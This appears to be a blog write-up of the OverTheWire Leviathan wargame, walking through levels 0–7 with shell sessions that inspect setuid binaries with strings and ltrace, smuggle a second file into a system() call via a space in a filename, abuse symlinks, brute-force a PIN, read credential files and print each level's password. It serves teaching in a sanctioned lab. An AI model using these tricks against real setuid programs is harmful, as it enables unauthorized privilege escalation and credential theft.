---
title: "[OTW] Разбор варгейма Leviathan"
permalink: /writeups/otw/leviathan/
excerpt: "Краткий разбор варгейма Leviathan с OverTheWire."
---

---
{% include toc icon="cog" title="Leviathan Wargame" %}
The [Leviathan](http://overthewire.org/wargames/leviathan/) wargame is an online game offered by the [OverTheWire](http://overthewire.org) community. This wargame doesn't require any knowledge about programming, just a bit of common
sense and some knowledge about basic \*nix commands. This is a quick write-up of my solutions but, before you read that post, please, try it yourself.
{: .text-justify}

**Заметка:** The passwords for each of the challenges can be found in **/etc/leviathan_pass/\<username\>**.
{: .notice--info}

## Решение уровня 00

The host to which you need to connect for this challenge is **leviathan.labs.overthewire.org**, on port **2223**. The username is **leviathan0** and the password is **leviathan0**.

```bash
$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223

leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root       4096 Oct 29 21:17 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Oct 29 21:17 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ls -la
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Oct 29 21:17 .
drwxr-xr-x 3 root       root         4096 Oct 29 21:17 ..
-rw-r----- 1 leviathan1 leviathan0 133259 Oct 29 21:17 bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep password
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## Решение уровня 01

I have to admit that the solution for this one came naturally. If you know the movie [Hackers](https://www.imdb.com/title/tt0113243/), this challenge is an easy one.

![image-center](/images/otw/hackers-movie-01.gif){: .align-center}

>**PHREAK:** Alright, what are the three most commonly used passwords?<br/>
>**JOEY:** Love, secret, and uh, sex. But not in that order, necessarily, right?<br/>
>**CEREAL:** Yeah but don't forget God. System operators love to use God. It's that whole male ego thing.<br/>

```bash
$ ssh leviathan1@leviathan.labs.overthewire.org -p 2223

leviathan1@leviathan:~$ ls 
check
leviathan1@leviathan:~$ strings check
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
puts
setreuid
printf
getchar
system
geteuid
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRhp
QVh;
secrf # Hum...
love  # ... :)
UWVS
t$,U
[^_]
password: 
/bin/sh
Wrong password, Good Bye ...

... snip ...

leviathan1@leviathan:~$ ./check
password: love
Wrong password, Good Bye ...
leviathan1@leviathan:~$ ./check
password: secret
Wrong password, Good Bye ...
leviathan1@leviathan:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

## Решение уровня 02

This challenge was the most interesting of the wargame and certainly the most difficult for me.

```bash
$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223

leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Interesting... Let's create a temporary folder with a file and do an `ltrace` to see the functions called by the process.

```bash
leviathan2@leviathan:~$ mkdir /tmp/ax
leviathan2@leviathan:~$ cd /tmp/ax
leviathan2@leviathan:/tmp/ax$ echo bar > foo.txt
leviathan2@leviathan:/tmp/ax$ ~/printfile foo.txt 
bar
leviathan2@leviathan:/tmp/ax$ ltrace  ~/printfile foo.txt
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("foo.txt", 4)                                                            = 0
snprintf("/bin/cat foo.txt", 511, "/bin/cat %s", "foo.txt")                     = 16
geteuid()                                                                       = 12002
geteuid()                                                                       = 12002
setreuid(12002, 12002)                                                          = 0
system("/bin/cat foo.txt"bar
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                          = 0
+++ exited (status 0) +++
```

Here we can see an *access()* call with our filename and a *system()* call to **/bin/cat** on the file. It took me a while to figure this out but, check what happens when you use a filename with a space...

```bash
leviathan2@leviathan:/tmp/ax$ echo blah > "foo.txt bar.txt"
leviathan2@leviathan:/tmp/ax$ cat "foo.txt bar.txt"
blah
leviathan2@leviathan:/tmp/ax$  ~/printfile "foo.txt bar.txt"
bar
/bin/cat: bar.txt: No such file or directory
leviathan2@leviathan:/tmp/ax$ ltrace  ~/printfile "foo.txt bar.txt"
__libc_start_main(0x804852b, 2, 0xffffd744, 0x8048610 <unfinished ...>
access("foo.txt bar.txt", 4)                                                    = 0
snprintf("/bin/cat foo.txt bar.txt", 511, "/bin/cat %s", "foo.txt bar.txt")     = 24
geteuid()                                                                       = 12002
geteuid()                                                                       = 12002
setreuid(12002, 12002)                                                          = 0
system("/bin/cat foo.txt bar.txt"bar
/bin/cat: bar.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                          = 256
+++ exited (status 0) +++
```

We have the following error **/bin/cat: bar.txt: No such file or directory** because the file **bar.txt** does not exist. However, the *access()* calls return successfully because the file exists and we have to proper access rights on it. But, the call to *system()* try to read 2 separate files. So, if we create a symbolic link of **/etc/leviathan_pass/leviathan3** named **bar.txt** we should be able to get the password.

```bash
leviathan2@leviathan:/tmp/ax$ ln -s /etc/leviathan_pass/leviathan3 bar.txt
leviathan2@leviathan:/tmp/ax$ ~/printfile "foo.txt bar.txt"
bar
Ahdiemoo1j
```

## Решение уровня 03

Another easy one :)

```bash
$ ssh leviathan3@leviathan.labs.overthewire.org -p 2223

leviathan3@leviathan:~$ ls -la
total 32
drwxr-xr-x  2 root       root        4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root        4096 Oct 29 21:17 ..
-rw-r--r--  1 root       root         220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root        3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan4 leviathan3 10288 Oct 29 21:17 level3
-rw-r--r--  1 root       root         675 May 15  2017 .profile
leviathan3@leviathan:~$ ./level3 
Enter the password> foobar
bzzzzzzzzap. WRONG
```

Let's try the same `ltrace` trick we used in the previous level.

```bash
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                      = -1
printf("Enter the password> ")                                                  = 20
fgets(Enter the password> foobar 
"foobar\n", 256, 0xf7fc55a0)                                              = 0xffffd590
strcmp("foobar\n", "snlprintf\n")                                               = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                      = 19
+++ exited (status 0) +++
leviathan3@leviathan:~$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```


## Решение уровня 04

This one required a bit of *bash-fu* but nothing to worry about...

```bash
$ ssh leviathan4@leviathan.labs.overthewire.org -p 2223

leviathan4@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root root       4096 Oct 29 21:17 ..
-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root root        675 May 15  2017 .profile
dr-xr-x---  2 root leviathan4 4096 Oct 29 21:17 .trash
leviathan4@leviathan:~$ cd .trash/
leviathan4@leviathan:~/.trash$ ls
bin
leviathan4@leviathan:~/.trash$ ./bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
leviathan4@leviathan:~/.trash$ ./bin | sed 's/ //g' | perl -lpe '$_=pack"B*",$_'
Tith4cokei
```

## Решение уровня 05

Symbolic links ftw !

```bash
$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223

leviathan5@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root       4096 Oct 29 21:17 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Oct 29 21:17 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ echo foo > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
foo
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
```

## Решение уровня 06

Quick and dirty.

```bash
$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223

leviathan6@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root       4096 Oct 29 21:17 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 7452 Oct 29 21:17 leviathan6
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan6@leviathan:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ./leviathan6 1234
Wrong
leviathan6@leviathan:~$ for i in {0000..9999}
> do 
> echo Trying $i...
> ./leviathan6 $i | grep -v "Wrong"
> sleep 0.01
> done
Trying 7117...
Trying 7118...
Trying 7119...
Trying 7120...
Trying 7121...
Trying 7122...
Trying 7123...
# Oooops...
^Z
[2]+  Stopped                 ./leviathan6 $i | grep -v "Wrong"
```

My script stopped at **7123**...

```bash
leviathan6@leviathan:~$ ./leviathan6 7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```

**Заметка:** You don't really need to exit the script. When it stops, you already are in the shell.
{: .notice--info}

## Решение уровня 07

No challenge here, you did it !

```bash
$ ssh leviathan7@leviathan.labs.overthewire.org -p 2223

leviathan7@leviathan:~$ ls -la
total 24
drwxr-xr-x  2 root       root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root       4096 Oct 29 21:17 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r--r-----  1 leviathan7 leviathan7  178 Oct 29 21:17 CONGRATULATIONS
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan7@leviathan:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```

I've been thinking about that last line, but the solutions already are all over the Web. I'll remove it if anyone complain.

**Fun Fact:** Out of curiosity, I checked others write-up on Internet. Some people just don't show the last level and some other just remove the last line of the **CONGRATULATIONS** file :)
{: .notice--success}
